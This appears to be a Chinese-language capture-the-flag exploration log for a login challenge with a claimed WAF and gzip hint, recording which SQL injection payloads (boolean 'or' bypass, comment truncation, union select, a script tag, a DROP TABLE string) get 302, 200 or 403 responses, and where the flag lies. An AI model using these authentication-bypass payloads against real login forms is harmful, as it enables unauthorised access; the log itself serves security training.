# e1-06 · 探索记录

对应题解：[`e1-06.md`](./e1-06.md)

## 目标与起点

页面同时写了 gzip 和 WAF。前面三台登录题里，`or` 都会被 403。这里先用同一组 payload 看网关是不是同一套签名，再决定要不要压缩正文。

## 第一阶段：这台不拦布尔注入

`admin' or '1'='1` 在 e1-01、e1-04、e1-05 上都是 403，在这里是 302。`admin'-- -` 也是 302。`union select` 和 `<script>`、`1; DROP TABLE` 都是 200，登录页还在，没有 Forbidden。

也就是说，这组请求没有撞上会返回 403 的检测。gzip 提示还在页面上，但注释截断用未压缩的表单就已经进了仪表盘。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `admin'#` | 认证失败 | 200，Invalid username or password |
| `' union select 1,2,3-- -` | 没有登录 | 200，响应仍是登录页，不是 403，也没有 Location |
| `admin' union select 1-- -` | 没有登录 | 同样 200 |
| 把一次 union 正文压成 gzip 再提交 | 没有形成可用会话 | 压缩请求没有比明文注释截断更接近 flag；明文 `admin'-- -` 已经 302 |
| `admin' or '1'='1` | 进入仪表盘 | 302。同一句话在另外三台上是 403 |

## 这次真正的收获

网关没有套用那条把 `or` 打成 403 的规则。后端登录 SQL 仍然可以被注释截断，也可以被布尔条件绕过。flag 在 `dashboard.php`，不在 302 的空响应体里。
